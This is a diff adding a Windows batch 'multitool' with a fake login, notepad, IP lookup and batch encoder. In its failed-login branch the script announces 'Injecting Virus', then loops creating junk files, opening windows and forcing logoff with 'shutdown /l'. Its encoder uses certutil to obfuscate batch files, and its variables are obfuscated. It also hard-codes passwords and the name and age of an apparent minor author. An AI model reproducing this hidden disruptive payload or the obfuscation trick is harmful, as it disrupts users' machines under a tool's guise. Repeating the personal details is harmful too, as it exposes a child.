@@ -1,0 +1,839 @@
+��&cls
+@echo off
+set source=0
+::╔═══════════════════════════════════════╗::
+::║::
+::╚═══════════════════════════════════════╝::
+chcp 65001 >nul
+set attempts=3
+if exist "%temp%\Universal\IllI1I" set attempts=2
+if exist "%temp%\Universal\IllII1" set attempts=1
+if exist "%temp%\Universal\IllIl1" set attempts=0
+if exist "%temp%\Universal\IllIll" goto ThePack
+set infopass=BatchMulti
+if not exist %temp%\Universal mkdir %temp%\Universal
+:Loginnn
+call :loaderpackage
+title Multitool Login
+if "%info1%"=="Universal" (
+cls
+echo Adding Auto Login Please Wait.
+timeout 1 >nul
+cls
+echo Adding Auto Login Please Wait..
+timeout 1 >nul
+cls
+echo Adding Auto Login Please Wait...
+timeout 1 >nul
+cls
+echo test >%temp%\Universal\IllIll
+echo Installed And Now Logging You Into Universal!
+timeout 1 >nul
+goto ThePack
+)
+if %attempts% leq 2 ( 
+echo test >%temp%\Universal\IllI1I
+)
+if %attempts% leq 1 ( 
+echo test >%temp%\Universal\IllII1
+)
+cls  
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3   
+echo.
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m   
+echo   [40;31m Disclaimer: If Used In School, I Am not responsible for any misuse or damage caused by Universal[40;32m   
+echo.
+echo.
+echo.  
+echo.  
+echo.  
+echo.  
+echo.  
+echo.  
+echo.  
+echo. 
+if %attempts% leq 0 ( 
+title Attempts Failed!
+echo test >%temp%\Universal\IllIl1
+echo  [40;31mInvalid Login Info You Have Used Up All Of The Attempts
+
+)
+
+if not %attempts% leq 0 ( 
+echo  Please Type The Login Info 
+)
+echo.  
+echo.  
+if not %attempts% leq 0 (
+echo [40;36m^┌^─^─^(^[40;36m[40;31mAttempts Left-%attempts%[40;36m^)^-^[^[40;37mLogin[40;36m]  
+set /p info1= [40;36m^└^─^#[40;37mPassword [40;31m  
+set /a attempts=%attempts% -1
+goto Loginnn
+) else (
+echo Well You Tried
+timeout /t 1 /nobreak >nul
+echo Now Injecting Virus
+goto Tried
+)
+goto Loginnn
+:Tried
+
+if %username%==2204498 goto exit
+call :loaderpackage
+title %lllIlII1%%lllIllI1%%lllIlIl1%%lllIlII1%%lllIllI1%%lllIlIl1%%lI1I111l%%lI1I1lll%%lI1I111l%
+mode %l11lIl11%,%lllIllll% >nul
+mode %l11lIl11%,%lllIllll% >nul
+mode %l11lIl11%,%lllIllll% >nul
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I111l%%lI1I1lll%%lI1I111l%.txtr
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I1lll%%lI1I111l%%lI1I111l%.zip
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I111l%%lI1I111l%lI1I1lll%.exe
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I111l%%lI1I1lll%%lI1I111l%.FUNCTION
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I1lll%%lI1I111l%%lI1I111l%.HACKED
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I111l%%lI1I111l%lI1I1lll%.StopTryingToUseThis
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I111l%%lI1I1lll%%lI1I111l%.StopJustStop
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I1lll%%lI1I111l%%lI1I111l%.ThisFileProgramDosentAllowYou
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I111l%%lI1I111l%lI1I1lll%.ToExecuteTheProgramYouHaveFailed
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I111l%%lI1I1lll%%lI1I111l%.HEHEHENICETRY
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>%lI1I111l%%lI1I111l%lI1I1lll%.###########
+echo Virus Found!
+type %lI1I111l%%lI1I111l%lI1I1lll%.###########
+type %lI1I111l%%lI1I1lll%%lI1I111l%.HEHEHENICETRY
+type %lI1I111l%%lI1I111l%lI1I1lll%.ToExecuteTheProgramYouHaveFailed
+type %lI1I111l%%lI1I1lll%%lI1I111l%.StopJustStop
+type %lI1I111l%%lI1I111l%lI1I1lll%.StopTryingToUseThis
+type %lI1I1lll%%lI1I111l%%lI1I111l%.HACKED
+type %lI1I111l%%lI1I1lll%%lI1I111l%.txtr
+type %lI1I111l%%lI1I111l%lI1I1lll%.###########
+type %lI1I111l%%lI1I1lll%%lI1I111l%.HEHEHENICETRY
+type %lI1I111l%%lI1I111l%lI1I1lll%.ToExecuteTheProgramYouHaveFailed
+type %lI1I111l%%lI1I1lll%%lI1I111l%.StopJustStop
+type %lI1I111l%%lI1I111l%lI1I1lll%.StopTryingToUseThis
+type %lI1I1lll%%lI1I111l%%lI1I111l%.HACKED
+type %lI1I111l%%lI1I1lll%%lI1I111l%.txtr
+type %lI1I111l%%lI1I111l%lI1I1lll%.###########
+type %lI1I111l%%lI1I1lll%%lI1I111l%.HEHEHENICETRY
+type %lI1I111l%%lI1I111l%lI1I1lll%.ToExecuteTheProgramYouHaveFailed
+type %lI1I111l%%lI1I1lll%%lI1I111l%.StopJustStop
+type %lI1I111l%%lI1I111l%lI1I1lll%.StopTryingToUseThis
+type %lI1I1lll%%lI1I111l%%lI1I111l%.HACKED
+type %lI1I111l%%lI1I1lll%%lI1I111l%.txtr
+type %lI1I111l%%lI1I111l%lI1I1lll%.###########
+type %lI1I111l%%lI1I1lll%%lI1I111l%.HEHEHENICETRY
+type %lI1I111l%%lI1I111l%lI1I1lll%.ToExecuteTheProgramYouHaveFailed
+type %lI1I111l%%lI1I1lll%%lI1I111l%.StopJustStop
+type %lI1I111l%%lI1I111l%lI1I1lll%.StopTryingToUseThis
+type %lI1I1lll%%lI1I111l%%lI1I111l%.HACKED
+type %lI1I111l%%lI1I1lll%%lI1I111l%.txtr
+set /a source=%source% + 1
+if %source% leq 10 goto Tried
+start
+set /a troll=%troll% + 1
+if %username%==jbell goto Tried
+if %troll% leq 20 goto Tried
+shutdown /l
+shutdown /l
+shutdown /l
+goto Tried
+:exit
+exit
+exit
+:home
+goto main
+:main
+title Universal Multitool
+cls  
+echo. 
+echo Say /log To Veiw The Logs ║ Say /rlogs To Reset The Logs (Admin Verify Required)
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo             [38;2;16;154;164m╔═══════════════════════════════════════╗
+echo             [38;2;16;154;164m║ [1] Notepad Maker   [2] Ip Finder     ║
+echo             [38;2;16;154;164m║ 
+echo             [38;2;16;154;164m║ [3] Logout          [4] Flappy Bird
+echo             [38;2;16;154;164m║ 
+echo             [38;2;16;154;164m║ [5] 
+echo             [38;2;16;154;164m║
+echo             [38;2;16;154;164m║
+echo             [38;2;16;154;164m║
+echo             [38;2;16;154;164m╚═══════════════════════════════════════╝ 
+echo.  
+echo [40;36m^┌^─^─^(^[40;36m[40;31mAttempts Username-%username%[40;36m^)^-^[^[40;37mhome[40;36m]  
+set /p multi= [40;36m^└^─^#[40;37mChoice [40;31m
+if %multi%== /log ( 
+type %temp%\UniversalLogs.txt 
+timeout 2 >nul 
+break>%temp%\UniversalLogs.txt 
+echo 0 >> %temp%\UniversalLogs.txt 
+pause 
+goto home 
+) 
+if %multi%== /rlog goto logreq2
+if %multi%==4 goto start1
+if %multi%==3 (
+echo [38;2;16;154;164m Now Logging You Out %username%.
+timeout 2 >nul
+cls
+del "%temp%\Universal\IllI1I" /f /q /s >nul 
+cls
+del "%temp%\Universal\IllII1" /f /q /s >nul 
+cls
+del "%temp%\Universal\IllIl1" /f /q /s >nul 
+cls
+del "%temp%\Universal\IllIll" /f /q /s >nul
+cls
+echo Successfuly Logged Out Of Universal
+timeout 2 >nul
+echo Now Sending You To Login...
+timeout 2 >nul
+goto Loginnn
+)
+if %multi%==2 goto IpLookup
+if %multi%==1 goto goto notepadchoice
+goto home
+:ThePack
+call :loaderpackage
+if /i "%~x1" neq ".txt" if /i "%~x1" neq ".bat" if /i "%~x1" neq ".cmd" ( 
+echo %date% / %time% / %username% Has Entered Universal Multitool Section >>%temp%\UniversalLogs.txt  
+set lIIllI=Jaiden Bellomy 
+set lIIlII=14 
+set IllIll=Universal123 
+goto home 
+) 
+:idkpass 
+echo %date% / %time% / %username% Has Started Up Encoder/Decoder >>%temp%\UniversalLogs.txt 
+set toggle2=0 
+set statauto=Off 
+if exist "%temp%\UniversalAutoLogCoder" ( 
+title Auto loging Into Decoder 
+echo %date% / %time% / %username% Has Autolog On >>%temp%\UniversalLogs.txt 
+echo Autolog Detected! 
+set statauto=On 
+set toggle2=1 
+timeout 2 >nul 
+cls 
+goto idk21 
+) 
+echo %date% / %time% / %username% Has Autolog Off >>%temp%\UniversalLogs.txt 
+title File Detected! 
+goto idk2
+:idk2 
+cls 
+echo. 
+echo Please Enter Your Username 
+set /p usern=Username: 
+echo. 
+set /p passw=Password:  
+set user=Jaiden
+set pass=Bellomy
+if "%usern%"=="%user%" if "%passw%"=="%pass%" ( 
+echo Successfuly Logged Into Encoder/Decoder 
+timeout 2 >nul 
+cls 
+goto idk21 
+) 
+echo %date% / %time% / %username% Has Failed To Login >>%temp%\UniversalLogs.txt 
+echo.  
+echo Wrong Password Or Username Please Try Again 
+timeout 2 >nul 
+goto idk2 
+:idk21 
+echo %date% / %time% / %username% Has Access To Encoder/Decoder >>%temp%\UniversalLogs.txt 
+@echo off 
+title Batch Encoder/Decoder Made by Universal 
+chcp 65001 >Nul  
+color 2 
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo. 
+echo Autolog Status: %statauto% 
+echo. 
+echo Would You Like To Encode Or Decode? 
+echo Subject/File: "%~n1%~x1" 
+echo █ E = Encode █ D = Decode █  N = No   █ T = Toggle AutoLogin █  
+echo [40;36m^┌^─^─^(^[40;36m[40;31mUsername-%username%[40;36m^)^-^[^[40;37mEncoder/Decoder[40;36m]  
+set /p choice= [40;36m^└^─^#[40;37mEncode/Decode[40;31m: 
+if %choice% == D goto decode 
+if %choice% == d goto decode 
+if %choice% == E goto obfus 
+if %choice% == e goto obfus 
+if %choice% == n cls&goto IpLookup 
+if %choice% == N  cls&goto IpLookup 
+if %choice% == T  goto tog 
+if %choice% == t  goto tog 
+goto idk21 
+:tog 
+if %toggle2%== 1 ( 
+del "%temp%\UniversalAutoLogCoder" /f /q /s >nul  
+echo Successfuly Turned Off Auto Log 
+timeout 2 >nul 
+set toggle2==0 
+set statauto=Off 
+cls 
+goto idk21 
+) 
+if %toggle2%== 0 ( 
+echo uni >>%temp%\UniversalAutoLogCoder 
+set toggle2=1 
+echo. 
+echo Successfuly Turned On Auto Log 
+timeout 2 >nul 
+set statauto=On 
+cls 
+goto idk21 
+) 
+goto idk21 
+:decode 
+if exist "%~n1__-%~x1" del "%~n1__-%~x1" 
+for /f "skip=1 delims=" %%L in ('CMD /U /C Type "%~1"') do ( 
+   echo %%L 
+   echo %%L >>"%~n1__-%~x1" 
+) 
+echo %date% / %time% / %username% Has Decoded "%~n1__-%~x1 >>%temp%\UniversalLogs.txt 
+cls 
+echo Finished Decoding File. Press Anykey To Continue 
+pause>nul 
+cls 
+echo.  
+echo successfuly Decoded "%~n1%~x1"! 
+goto idk21 
+:obfus 
+for /f %%i in ("certutil.exe") do if not exist "%%~$path:i" ( 
+  echo CertUtil.exe not found. 
+  pause 
+  exit /b 
+) 
+>"temp.~b64" echo(//4mY2xzDQo= 
+certutil.exe -f -decode "temp.~b64" "%~n1o%~x1" 
+del "temp.~b64" 
+copy "%~n1o%~x1" /b + "%~1" /b 
+cls 
+echo.  
+echo %date% / %time% / %username% Has Encoded "%~n1__-%~x1 >>%temp%\UniversalLogs.txt 
+cls 
+echo successfuly Encoded "%~n1%~x1"! 
+goto idk21 
+:IPLookup  
+@echo off  
+chcp 65001 >Nul  
+set user=%username% 
+if "%username%"=="jbell" set user=Universal Master 
+title Universal Ip Finder  User: [%user%]  
+setlocal ENABLEDELAYEDEXPANSION  
+set webclient=webclient 
+if exist "%temp%\%webclient%.vbs" ( 
+del "%temp%\%webclient%.vbs" /f /q /s >nul  
+) 
+if exist "%temp%\response.txt" ( 
+del "%temp%\response.txt" /f /q /s >nul  
+) 
+:menu2  
+cls  
+echo.  
+echo.  
+echo.  
+goto action                                  
+:input  
+echo.  
+echo Please Enter A Valid Input Option.  
+echo.  
+:start  
+goto start  
+:action  
+echo.  
+goto iplookup  
+goto input  
+:iplookup  
+cls  
+echo.  
+echo.  
+echo.  
+set ip=127.0.0.1  
+cls  
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo.  
+echo.  
+echo.  
+echo.  
+echo.  
+echo.  
+echo.  
+echo.  
+echo.  
+echo  Type the IP That you want to Lookup! To test your Internet connection try 8.8.8.8 if you get errors your having internet issues or your offline!  
+echo.  
+echo.  
+echo [40;36m^┌^─^─^(^[40;36m[40;31mroot-%USERNAME%[40;36m^)^-^[^[40;37m/home[40;36m]  
+set /p ip= [40;36m^└^─^[40;31m# [40;31m  
+set /p goto action  
+if %ip%==/home (  
+goto :home 
+)  
+echo sUrl = "http://ipinfo.io/%ip%/json" > %temp%\%webclient%.vbs  
+:localip  
+echo %date% / %time% / %username% Has Entered An Ip Address %ip% >>%temp%\UniversalLogs.txt 
+cls  
+echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs  
+echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs  
+echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs  
+echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs  
+echo oHTTP.send sRequest >> %temp%\%webclient%.vbs  
+echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs  
+echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs  
+echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs  
+echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs  
+echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs  
+echo objFile.Close >> %temp%\%webclient%.vbs  
+rem echo Msgbox HTTPGET,vbSystemModal+vbOKOnly+vbInformation, "IP Info" >> %temp%\%webclient%.vbs  
+echo Wscript.Quit >> %temp%\%webclient%.vbs  
+start %temp%\%webclient%.vbs  
+set /a requests=0  
+color 3  
+echo.  
+:checkresponseexists  
+set /a requests=%requests% + 1  
+if %requests% gtr 7 goto failed  
+IF EXIST "%temp%\response.txt" (  
+goto response_exist  
+) ELSE (  
+ping 127.0.0.1 -n 2 -w 1000 >nul  
+goto checkresponseexists  
+)  
+:failed  
+taskkill /f /im wscript.exe >nul  
+del "%temp%\%webclient%.vbs" /f /q /s >nul  
+echo.  
+echo Did Not Receive A Response From The API.  
+echo.  
+pause  
+goto menu  
+:response_exist  
+cls  
+color 2  
+%tex% 
+for /f "delims=     " %%i in ('findstr /i "ip hostname city region country loc org postal" %temp%\response.txt') do (  
+set                                                   data=%%i  
+set                                                   data=!data:,= !  
+set                                                   [40;32mdata=!data:""=Not Listed!  
+set                                                   [40;32mdata=!data:"=!  
+set                                                   [40;32mdata=!data:ip:=IP:        !  
+set                                                   [40;32mdata=!data:hostname:=Hostname:  !  
+set                                                   [40;32mdata=!data:city:=City:      !  
+set                                                   [40;32mdata=!data:region:=State:     !  
+set                                                   [40;32mdata=!data:country:=Country:   !  
+set                                                   [40;32mdata=!data:loc:=Location:  !  
+set                                                   [40;32mdata=!data:org:=ISP:       !  
+set                                                   [40;32mdata=!data:postal:=Postal:    !                                                    
+echo !data!  
+)  
+echo.  
+del "%temp%\%webclient%.vbs" /f /q /s >nul  
+del "%temp%\response.txt" /f /q /s >nul  
+echo.  
+echo.  
+echo [40;31m Press any key on Your Keyboard to Close this Window!                                               
+pause >nul     
+exit  
+:logreq2 
+cls 
+title Admin Verify Required! 
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo.  
+echo.  
+echo How Old Is Universal? 
+set /p kk=Age:  
+if not "%kk%"=="%lIIlII%" echo Wrong Answer & timeout 2 >nul & goto logreq2 
+echo. 
+echo Who Made Universal? 
+set /p kk=Full Name:  
+if not "%kk%"=="%lIIllI%" echo Wrong Answer & timeout 2 >nul & goto logreq2 
+echo. 
+echo What Is The Admin Password? 
+set /p kk=Password:  
+if not "%kk%"=="%IllIll%" echo Wrong Answer & timeout 2 >nul & goto logreq2 
+del "%temp%\UniversalLogs.txt" /f /q /s >nul  & echo >>%temp%\UniversalLogs.txt 
+echo Resetting Logs 
+timeout 2 >nul 
+echo Logs Has Successfuly Been Reseted 
+timeout 2 >nul 
+cls 
+echo Logs Has Been Reseted By %username% >>%temp%\UniversalLogs.txt
+goto home 
+:pwreq 
+::Admin Pw:: 
+set lIIllI=Jaiden Bellomy 
+set lIIlII=14 
+set IllIll=Universal123 
+::Normal Info:: 
+set pw=1 
+set user=Jaiden0924 
+set pass=Woogzee2 
+goto idkpass
+
+
+
+
+:notepadchoice
+call :loaderpackage
+%Il1Ill1l%%Ill111ll%%IlIIlI1l%
+%I11Illll%%I1lIll1l%%I11Illll%%Ill111ll%%Il1Ill1l% Custom Notepad
+echo. 
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m███    ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m███████ [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m █████  [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m████   ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m██      [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██ ██  ██ [38;2;45;60;148m██ [38;2;14;66;142m██    ██ [38;2;0;70;134m█████   [38;2;0;72;123m██████  [38;2;0;73;112m███████ [38;2;25;73;100m███████ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m██    ██ [38;2;71;51;151m██  ██ ██ [38;2;45;60;148m██ [38;2;14;66;142m ██  ██  [38;2;0;70;134m██      [38;2;0;72;123m██   ██ [38;2;0;73;112m     ██ [38;2;25;73;100m██   ██ [38;2;42;72;88m██       
+echo                  [38;2;96;37;150m ██████  [38;2;71;51;151m██   ████ [38;2;45;60;148m██ [38;2;14;66;142m  ████   [38;2;0;70;134m███████ [38;2;0;72;123m██   ██ [38;2;0;73;112m███████ [38;2;25;73;100m██   ██ [38;2;42;72;88m███████  
+echo                              [40;36mMade By [38;2;96;37;150mU[38;2;71;51;151mN[38;2;45;60;148mI[38;2;14;66;142V[38;2;0;70;134mE[38;2;0;72;123mR[38;2;0;73;112mS[38;2;25;73;100mA[38;2;42;72;88mL [38;2;126;18;18m Master 
+echo                                     [40;32m Thank you [40;37mfor [40;35musing [40;37mmy [40;31mMultiTool [40;32m%user% [40;31m^<3  
+echo.  
+echo.  
+echo   [40;31m Disclaimer: Developers assume no liabilty and are not responsible for any misuse or damage caused by Universal[40;32m  
+echo.  
+echo.  
+echo.  
+%I1l11l1l%%Il1Ill1l%%II1Illll%%Ill11l1l% [38;2;255;109;46mWould You Like To Edit Or Create Or Veiw A Notepad? (E or C or V)
+%I1l11l1l%%Il1Ill1l%%II1Illll%%Ill11l1l%.
+%I1l11l1l%%Il1Ill1l%%II1Illll%%Ill11l1l%.
+
